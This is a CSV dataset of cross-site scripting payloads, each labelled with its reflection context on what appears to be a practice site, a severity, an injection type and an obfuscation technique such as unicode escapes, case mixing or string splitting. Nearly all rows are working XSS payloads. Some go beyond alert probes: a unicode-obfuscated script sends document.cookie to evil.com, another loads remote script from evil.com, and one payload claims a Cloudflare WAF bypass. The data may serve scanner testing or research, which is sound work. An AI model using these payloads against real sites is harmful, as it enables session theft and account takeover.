payload,payload_with_context,context,severity,source,sink,reflection_position,technique
"></SCRIPT>"">'><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>","></SCRIPT>"">'><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT> [position:attribute snippet_context:...nk:</strong> <code>name</code> injected inside JS string: <code>var username = '></SCRIPT>"">'><SC]",tag_injection,high,,,attribute,encoding|case_variation
"\"" OnErRoR=AlErT(1)//","\"" OnErRoR=AlErT(1)// [position:style]",attribute_escape,medium,,,style,obfuscated:mixed_case
prompt(9),prompt(9) [position:attribute snippet_context:...round:var(--bg-0);color:var(--text-primary);padding:2rem} .box{border:2px solid prompt(9);padding],tag_injection,medium,,,attribute,none
innerHTML=location.hash>#<script>alert(1)</script>,"innerHTML=location.hash>#<script>alert(1)</script> [position:html_body snippet_context:...st-meta""><span class=""post-author"">Anonymous</span> · just now</div> <div>innerHTML=location.hash]",tag_injection,high,,,html_body,none
<svg><a onload=alert(1)></a>,"<svg><a onload=alert(1)></a> [position:html_body snippet_context:...t-primary);padding:.65rem .9rem;border-radius:6px;font-family:Inter,sans-serif""><svg><a onload=al]",tag_injection,medium,,,html_body,none
"%20""><svg onload=alert(1)>","%20""><svg onload=alert(1)> [position:attribute snippet_context:..."">Nexora Member</span></div> </div> </div> <div class=""card"" data-user=""%20""><svg onload=alert(1)]",tag_injection,medium,,,attribute,url_encoding
"""><svg onload=prompt`1`>","""><svg onload=prompt`1`> [position:attribute snippet_context:....82rem;color:var(--text-muted);margin-bottom:1rem"">Showing results for: <strong>""><svg onload=pro]",attribute_escape,medium,,,attribute,mutated
<svg/onload=al'+'ert(1)>,<svg/onload=al'+'ert(1)> [position:script],tag_injection,medium,,,script,obfuscated:concat_split
onload='confirm(1)',onload='confirm(1)' [position:html_body],tag_injection,medium,,,html_body,mutated
"{{constructor.constructor(""alert(1)"")()}}","{{constructor.constructor(""alert(1)"")()}} [position:script]",template_injection,low,,,script,original
"onerror=""alert('AnonKryptiQuz')""","onerror=""alert('AnonKryptiQuz')"" [position:attribute snippet_context:...g> <code>color</code> param in unquoted attribute: <code>style=background-color:onerror=""alert('A]",tag_injection,medium,,,attribute,none
onload='alert(1)',onload='alert(1)' [position:html_body],attribute_escape,medium,,,html_body,none
<svg////////onload=alert(1)>,"<svg////////onload=alert(1)> [position:comment snippet_context:...style=""color:var(--text-muted);font-size:.875rem"">← DOM XSS</a> <!-- param:name=<svg////////onloa]",tag_injection,medium,,,comment,none
#{alert(1)},#{alert(1)} [position:script],template_injection,high,,,script,original
;alert(1);,";alert(1); [position:html_body snippet_context:;alert(1);({""status"": ""ok"", ""message"": ""Nexora API response""});]",tag_injection,medium,,,html_body,none
"onmouseenter=""alert(1)""","onmouseenter=""alert(1)"" [position:attribute snippet_context:....82rem;color:var(--text-muted);margin-bottom:1rem"">Showing results for: <strong>onmouseenter=""ale]",attribute_escape,medium,,,attribute,mutated
<img src=asdf onerror=alert(JSON.stringify(sessionStorage))>,"<img src=asdf onerror=alert(JSON.stringify(sessionStorage))> [position:attribute snippet_context:..."">Nexora Member</span></div> </div> </div> <div class=""card"" data-user=""<img src=asdf onerror=ale]",tag_injection,high,,,attribute,none
\' onerror=alert(1)//,\' onerror=alert(1)// [position:script],event_handler,high,,,script,obfuscated:hex_escape
<%= alert(1) %>,<%= alert(1) %> [position:style],template_injection,low,,,style,original
<svg id=1 onload=confirm(1)>,<svg id=1 onload=confirm(1)> [position:dom snippet_context:1],tag_injection,medium,,,dom,none
"<script>alert(String.fromCharCode(88,83,83))</script>","<script>alert(String.fromCharCode(88,83,83))</script> [position:attribute snippet_context:...-radius:6px;cursor:pointer;margin-left:.5rem"">Load</button></form> <iframe src=""<script>alert(Str]",tag_injection,high,,,attribute,encoding
<body onunhandledrejection=alert(1)><script>fetch('//xyz')</script>,"<body onunhandledrejection=alert(1)><script>fetch('//xyz')</script> [position:html_body snippet_context:...t-primary);padding:.65rem .9rem;border-radius:6px;font-family:Inter,sans-serif""><body onunhandled]",tag_injection,high,,,html_body,none
<script>alert(document.domain)</script>,<script>alert(document.domain)</script> [position:script],dom_sink,high,,,script,original
"a=`\u003c`,b=`\u003e`,location=`javascript:[].findIndex(dump)+(/${a}img src=# onerror=alert(1)${b}/.source)`","a=`\u003c`,b=`\u003e`,location=`javascript:[].findIndex(dump)+(/${a}img src=# onerror=alert(1)${b}/.source)` [position:script snippet_context:...nk:</strong> <code>name</code> injected inside JS string: <code>var username = 'a=`\u003c`,b=`\u0]",script_injection,high,,,script,unicode_escape
<img src/onerror=prompt(8)>,<img src/onerror=prompt(8)> [position:dom snippet_context:8],tag_injection,medium,,,dom,none
<script src=//evil.com/xss.js></script>,<script src=//evil.com/xss.js></script> [position:html_body],script_injection,high,,,html_body,original
"javascript:void(document.location=""http://evil.com"")","javascript:void(document.location=""http://evil.com"") [position:html_body]",js_uri,high,,,html_body,original
"document.body.innerHTML=""<img src=x onload=alert(1)>""","document.body.innerHTML=""<img src=x onload=alert(1)>"" [position:script]",dom_sink,low,,,script,mutated
<iframe/onload=alert(0);>,"<iframe/onload=alert(0);> [position:dom snippet_context:Congratulations, you executed an alert:

0

You can now advance to the next level.]",tag_injection,medium,,,dom,none
"<ifr\u0061me src=""j\u0061v\u0061script:\u0061\u006cert(1)"">","<ifr\u0061me src=""j\u0061v\u0061script:\u0061\u006cert(1)""> [position:script]",tag_injection,medium,,,script,obfuscated:unicode_escape
<img src=x onerror=alert(1)>,<img src=x onerror=alert(1)> [position:script],tag_injection,high,,,script,original
"//"";ALeRt(StriNg.frOmcharcode(88,83,83))","//"";ALeRt(StriNg.frOmcharcode(88,83,83)) [position:html_body snippet_context:...<div class=""post-meta""><span class=""post-author"">Guest</span></div> <div>//"";aLErt(sTRING.FroMcHa]",tag_injection,high,,,html_body,mutated
<svg onload=alert(1)>,<svg onload=alert(1)> [position:none],event_handler,high,,,none,original
</script><svg onload=alert(1)>,"</script><svg onload=alert(1)> [position:html_body snippet_context:...t-primary);padding:.65rem .9rem;border-radius:6px;font-family:Inter,sans-serif""></script><svg onl]",tag_injection,medium,,,html_body,none
"data:text/html,<script>alert(1)</script>","data:text/html,<script>alert(1)</script> [position:html_body]",js_uri,high,,,html_body,original
"{{constructor.constructor(""alert(1)"")()}}","{{constructor.constructor(""alert(1)"")()}} [position:html_body]",template_injection,high,,,html_body,original
"""><img src=x onerror=alert(1)>","""><img src=x onerror=alert(1)> [position:script]",script_injection,high,,,script,original
<marquee onstart=alert(1)>,<marquee onstart=alert(1)> [position:attribute],event_handler,low,,,attribute,original
<script>prompt(1)</script>,<script>prompt(1)</script> [position:html_body],script_injection,medium,,,html_body,obfuscated:concat_split
javascript:confirm(1),javascript:confirm(1) [position:attribute],js_uri,high,,,attribute,mutated
"""><script>alert(String.fromCharCode(88,83,83))</script>","""><script>alert(String.fromCharCode(88,83,83))</script> [position:attribute snippet_context:...ary);margin:.75rem 0"">Click below to continue to your destination.</p> <a href=""""><script>alert(S]",tag_injection,high,,,attribute,encoding
' onmouseover=alert(1) ',' onmouseover=alert(1) ' [position:attribute],attribute_escape,high,,,attribute,mutated
"\""><img src=x onerror=alert(1)>","\""><img src=x onerror=alert(1)> [position:script]",script_injection,low,,,script,original
<script ^__^>alert(String.fromCharCode(49))</script ^__^,<script ^__^>alert(String.fromCharCode(49))</script ^__^ [position:attribute snippet_context:...nk:</strong> <code>name</code> injected inside JS string: <code>var username = '<script ^__^>aler],tag_injection,high,,,attribute,encoding
<script ^__^>alert(String.fromCharCode(49))</script ^__^,<script ^__^>alert(String.fromCharCode(49))</script ^__^ [position:attribute snippet_context:...round:var(--bg-0);color:var(--text-primary);padding:2rem} .box{border:2px solid <script ^__^>aler],tag_injection,high,,,attribute,encoding
' ><img src=x onerror=alert(1)>,' ><img src=x onerror=alert(1)> [position:attribute],js_uri,medium,,,attribute,original
' onload=alert(1) x=',' onload=alert(1) x=' [position:attribute],attribute_escape,high,,,attribute,mutated
' onmouseover=\u0061\u006cert(1) ',' onmouseover=\u0061\u006cert(1) ' [position:attribute],attribute_escape,high,,,attribute,obfuscated:unicode_escape
prompt(9),"prompt(9) [position:attribute snippet_context:<!DOCTYPE html><html><head> <meta http-equiv=""refresh"" content=""5;url=prompt(9)""> <link rel=""stylesh]",tag_injection,medium,,,attribute,none
"></SCRIPT>"">'><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>","></SCRIPT>"">'><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT> [position:attribute snippet_context:...g> <code>color</code> param in unquoted attribute: <code>style=background-color:></SCRIPT>"">'><SC]",tag_injection,high,,,attribute,encoding|case_variation
<img src=x onload=alert(1)>,<img src=x onload=alert(1)> [position:script],tag_injection,high,,,script,mutated
"<script>alert(String.fromCharCode(88,83,83))</script>","<script>alert(String.fromCharCode(88,83,83))</script> [position:attribute snippet_context:<!DOCTYPE html><html><head> <meta http-equiv=""refresh"" content=""5;url=<script>alert(String.fromCharC]",tag_injection,high,,,attribute,encoding
<BODY ONLOAD=alert(8839)>,"<BODY ONLOAD=alert(8839)> [position:html_body snippet_context:...gin-bottom:.75rem"">Bio</div> <div style=""font-size:.925rem;line-height:1.7""><BODY ONLOAD=alert(88]",tag_injection,medium,,,html_body,case_variation
"window[""ev"".concat(""al"")](String.fromCharCode(97,108,101,114,116,40,49,41));","window[""ev"".concat(""al"")](String.fromCharCode(97,108,101,114,116,40,49,41)); [position:attribute snippet_context:...g> <code>color</code> param in unquoted attribute: <code>style=background-color:window[""ev"".conca]",tag_injection,high,,,attribute,encoding
"<svg onload=""confirm(7)"">","<svg onload=""confirm(7)""> [position:html_body snippet_context:<svg onload=""confirm(7)"">({""status"": ""ok"", ""message"": ""Nexora API response""});]",tag_injection,medium,,,html_body,none
%3cimg onerror=alert(1) src=a%3e,"%3cimg onerror=alert(1) src=a%3e [position:attribute snippet_context:...ary);margin:.75rem 0"">Click below to continue to your destination.</p> <a href=""%3cimg onerror=al]",tag_injection,medium,,,attribute,url_encoding
""" onload=alert(1) x=""",""" onload=alert(1) x="" [position:attribute]",attribute_escape,high,,,attribute,obfuscated:url_encode
"<Svg Only=1 OnLoad=confirm(atob(""Q2xvdWRmbGFyZSBCeXBhc3NlZCA6KQ==""))>","<Svg Only=1 OnLoad=confirm(atob(""Q2xvdWRmbGFyZSBCeXBhc3NlZCA6KQ==""))> [position:script snippet_context:...ong>Sink:</strong> <code>lang</code> inside JS string: <code>var currentLang = ""<Svg Only=1 OnLoa]",tag_injection,high,,,script,encoding|case_variation
<;BODY ONLOAD=alert(';XSS';)>;,"<;BODY ONLOAD=alert(';XSS';)>; [position:attribute snippet_context:...-radius:6px;cursor:pointer;margin-left:.5rem"">Load</button></form> <iframe src=""<;BODY ONLOAD=ale]",tag_injection,medium,,,attribute,none
-alert(1)-',"-alert(1)-' [position:attribute snippet_context:<!DOCTYPE html><html><head> <meta http-equiv=""refresh"" content=""5;url=-alert(1)-'""> <link rel=""style]",tag_injection,medium,,,attribute,none
"""><audio alert(String.fromCharCode(88,83,83))</script>","""><audio alert(String.fromCharCode(88,83,83))</script> [position:attribute snippet_context:..."">Nexora Member</span></div> </div> </div> <div class=""card"" data-user=""""><audio alert(String.fro]",tag_injection,high,,,attribute,mutated
{{7*7}},{{7*7}} [position:none],dom_sink,medium,,,none,mutated
alert(1),alert(1) [position:html_body snippet_context:...ea&gt;</code> without escaping. Close with <code>&lt;/textarea&gt;&lt;script&gt;alert(1)&lt;/scri],tag_injection,medium,,,html_body,none
<svg/onload=alert(1)>,<svg/onload=alert(1)> [position:script],tag_injection,high,,,script,obfuscated:comment_inject
"<script>document.\u006coc\u0061tion=""http://evi\u006c.com/?c=""+document.cookie</script>","<script>document.\u006coc\u0061tion=""http://evi\u006c.com/?c=""+document.cookie</script> [position:style]",js_uri,medium,,,style,obfuscated:unicode_escape
onerror='alert(1)',"onerror='alert(1)' [position:attribute snippet_context:...-radius:6px;cursor:pointer;margin-left:.5rem"">Load</button></form> <iframe src=""onerror='alert(1)]",tag_injection,medium,,,attribute,none
"<object data=""javascript:alert(1)"">","<object data=""javascript:alert(1)""> [position:html_body]",tag_injection,medium,,,html_body,original
""">< script>alert(String.fromCharCode(88,83,83))</script>",""">< script>alert(String.fromCharCode(88,83,83))</script> [position:html_body snippet_context:..."">Nexora Member</span></div> </div> </div> <div class=""card"" data-user="""">< script>alert(String.f]",tag_injection,high,,,html_body,mutated
-alert(23)/,"-alert(23)/ [position:attribute snippet_context:...ary);margin:.75rem 0"">Click below to continue to your destination.</p> <a href=""-alert(23)/"" styl]",tag_injection,medium,,,attribute,none
${alert(1)},${alert(1)} [position:attribute],attribute_escape,high,,,attribute,mutated
#{alert(1)},#{alert(1)} [position:none],template_injection,high,,,none,mutated
onerror=”alert(‘AnonKryptiQuz’),onerror=”alert(‘AnonKryptiQuz’) [position:attribute snippet_context:...g> <code>color</code> param in unquoted attribute: <code>style=background-color:onerror=”alert(‘A],tag_injection,medium,,,attribute,none
<input onfocus=alert(1) autofocus>,<input onfocus=alert(1) autofocus> [position:script],event_handler,medium,,,script,mutated
' onerror=confirm(1) x=',' onerror=confirm(1) x=' [position:attribute],attribute_escape,high,,,attribute,mutated
"<iframe src=""javascript:alert(1)"">","<iframe src=""javascript:alert(1)""> [position:html_body]",tag_injection,low,,,html_body,mutated
"\x3cembed src=""javascript:alert(1)""\x3e","\x3cembed src=""javascript:alert(1)""\x3e [position:none]",event_handler,medium,,,none,obfuscated:hex_escape
"""+ONeRror=PrOmpT(123)""+","""+ONeRror=PrOmpT(123)""+ [position:attribute snippet_context:...g> <code>color</code> param in unquoted attribute: <code>style=background-color:""+ONeRror=PrOmpT(]",attribute_escape,medium,,,attribute,mutated
<img src/onerror=alert(1)>,"<img src/onerror=alert(1)> [position:attribute snippet_context:...ng>Sink:</strong> <code>val</code> inside onclick handler: <code>onclick=""calc('<img src/onerror=]",tag_injection,medium,,,attribute,none
<svg	 onload=alert()>,<svg	 onload=alert()> [position:dom],tag_injection,medium,,,dom,mutated
<script>prompt(1)</script>,<script>prompt(1)</script> [position:html_body],script_injection,low,,,html_body,original
<BODY ONLOAD=alert(‘XSS’)>,"<BODY ONLOAD=alert(‘XSS’)> [position:comment snippet_context:...style=""color:var(--text-muted);font-size:.875rem"">← DOM XSS</a> <!-- param:name=<BODY ONLOAD=aler]",tag_injection,medium,,,comment,case_variation
"""><svg OnLOAd=alERt()>","""><svg OnLOAd=alERt()> [position:dom]",tag_injection,medium,,,dom,mutated
onerror=alert(0);>,"onerror=alert(0);> [position:html_body snippet_context:...t-primary);padding:.65rem .9rem;border-radius:6px;font-family:Inter,sans-serif"">onerror=alert(0);]",tag_injection,medium,,,html_body,none
"eval(""alert(1)"")","eval(""alert(1)"") [position:script]",script_injection,high,,,script,original
"//--></SCRIPT><SCRIPT>alert(String.fromCharCode(88,83,83));","//--></SCRIPT><SCRIPT>alert(String.fromCharCode(88,83,83)); [position:html_body snippet_context:...;border:1px solid var(--border);border-radius:6px;padding:1rem;margin:.75rem 0"">//--></SCRIPT><SC]",tag_injection,high,,,html_body,encoding|case_variation
